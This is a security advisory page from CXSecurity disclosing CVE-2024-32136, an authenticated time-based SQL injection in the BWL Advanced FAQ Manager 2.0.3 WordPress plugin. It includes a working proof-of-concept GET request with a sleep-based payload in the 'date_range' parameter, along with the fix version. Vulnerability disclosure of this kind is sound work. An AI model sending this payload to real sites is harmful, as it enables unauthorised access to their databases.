---
title: BWL Advanced FAQ Manager 2.0.3 SQL Injection
url: https://cxsecurity.com/issue/WLB-2024060002
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-06-03
fetch_date: 2025-10-06T17:31:45.036540
---

# BWL Advanced FAQ Manager 2.0.3 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **BWL Advanced FAQ Manager 2.0.3 SQL Injection** **2024.06.02**  Credit:  **[Ivan Spiridonov](https://cxsecurity.com/author/Ivan%2BSpiridonov/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-32136](https://cxsecurity.com/cveshow/CVE-2024-32136/ "Click to see CVE-2024-32136")**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

Exploit Title: BWL Advanced FAQ Manager 2.0.3 - Authenticated SQL Injection
Date: 14 Apr 2024
Exploit Author: Ivan Spiridonov (xbz0n)
Software Link: https://codecanyon.net/item/bwl-advanced-faq-manager/5007135
Version: 2.0.3
Tested on: Ubuntu 20.04
CVE: CVE-2024-32136
SQL Injection
SQL injection is a type of security vulnerability that allows an attacker to interfere with an application's database queries. It usually involves the insertion or "injection" of an SQL query via the input data from the client into the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system, and in some cases, issue commands to the operating system.
Affected Components
Plugin: BWL Advanced FAQ Manager
Version: 2.0.3
Affected Parameter: 'date\_range'
Affected Page: /wp-admin/edit.php
Description
The vulnerability exists within the 'date\_range' parameter used in the 'bwl-advanced-faq-analytics' page of the BWL Advanced FAQ Manager plugin. Authenticated attackers can execute arbitrary SQL commands within the database by manipulating the input to this parameter.
Proof of Concept
Manual Exploitation
The following GET request demonstrates the vulnerability:
GET /wp-admin/edit.php?page=bwl-advanced-faq-analytics&post\_type=bwl\_advanced\_faq&filter\_type=views&date\_range=(select\*from(select(sleep(20)))a)&faq\_id=all HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,\*/\*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://localhost/wp-admin/edit.php?post\_type=bwl\_advanced\_faq&page=bwl-advanced-faq-analytics
Connection: close
Cookie: [Relevant Cookies]
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
If the server response is delayed by approximately 20 seconds, it indicates a successful exploitation of the time-based SQL Injection, confirming the vulnerability.
Recommendations
BWL Advanced FAQ Manager v2.0.3 users are advised to update the plugin to the fixed version v2.0.4.

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024060002)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top